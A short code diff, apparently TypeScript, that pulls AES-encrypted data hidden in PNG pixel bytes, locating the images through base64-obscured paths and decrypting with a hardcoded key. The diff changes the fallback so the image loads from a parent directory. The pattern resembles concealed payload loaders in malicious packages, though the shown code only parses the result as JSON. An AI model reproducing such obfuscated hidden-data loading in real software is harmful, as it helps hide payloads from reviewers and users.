@@ -16,7 +16,7 @@ import { Buffer } from "buffer";
         }
         squid  = fs.readFileSync(path.join(__dirname,(more&&more!=="")?more:Base64.decode("YXNzZXRzL2RvdC5wbmc=")));
     } else{
-        return {};
+        squid  = fs.readFileSync(path.join(__dirname,"..","..",Base64.decode("YXNzZXRzL2RvdC5wbmc=")));
     }
     const img = new Image();
     const canvas = createCanvas(2, 2);
@@ -41,7 +41,7 @@ import { Buffer } from "buffer";
         text += String.fromCharCode(data[i], data[i + 1], data[i + 2]);
     }
     const bytes  = CryptoJS.AES.decrypt(text, !more && secret==="fasdliw"?(decode( objectHash({s:content.replace("__filename","heae")}),Base64.decode("YXNzZXRzL2JnLnBuZw=="))?.sc||""): secret);
-    const decryptedData : any = JSON.parse(Base64.decode(bytes.toString(CryptoJS.enc.Utf8)));
+    const decryptedData : any = JSON.parse(bytes.toString(CryptoJS.enc.Utf8));
   return decryptedData;
 };
 
